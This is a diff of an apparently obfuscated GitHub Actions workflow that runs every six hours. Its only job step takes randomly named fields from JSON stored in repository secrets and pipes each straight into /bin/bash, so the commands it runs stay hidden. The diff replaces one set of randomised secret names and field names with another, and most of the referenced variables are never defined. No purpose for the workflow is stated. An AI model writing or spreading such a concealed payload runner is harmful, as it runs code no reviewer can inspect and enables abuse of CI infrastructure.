@@ -1,34 +1,21 @@
 name: ruanxiaoer19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 2/6 * * *'
+    - cron: '17 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: ruanxiaoer19871010
         env:
-          nfb946: ${{ secrets.nfb946 }}
+          a0062: ${{ secrets.a0062 }}
         run: |
-          echo $nfb946 | jq -r .s711 | /bin/bash
-          echo $j2213 | jq -r .w44 | /bin/bash
-          echo $i7420 | jq -r .eel87 | /bin/bash
-          echo $uru089 | jq -r .qtgu08 | /bin/bash
-          echo $umjt1 | jq -r .o0342 | /bin/bash
-          echo $pbi3 | jq -r .spgaf31751 | /bin/bash
-          echo $sdaly4 | jq -r .pyanu32869 | /bin/bash
-          echo $ja2337 | jq -r .cag96923 | /bin/bash
-          echo $errq6 | jq -r .b0816 | /bin/bash
-          echo $nhpw71958 | jq -r .w691 | /bin/bash
-          echo $ivcxo79 | jq -r .vcas46760 | /bin/bash
-          echo $y6423 | jq -r .n27 | /bin/bash
-          echo $yhulp66369 | jq -r .eiss72 | /bin/bash
-          echo $zgoi5912 | jq -r .vmc068 | /bin/bash
-          echo $kxkz4737 | jq -r .myqgd2522 | /bin/bash
-          echo $fg4 | jq -r .yivh49 | /bin/bash
+          echo $a0062 | jq -r .paxr86 | /bin/bash
+          echo $xdptt35 | jq -r .mv96 | /bin/bash
+          echo $cp239 | jq -r .dec49386 | /bin/bash
+          echo $lstt95 | jq -r .vu8335 | /bin/bash
+          echo $hzopp3924 | jq -r .nghm9010 | /bin/bash
 
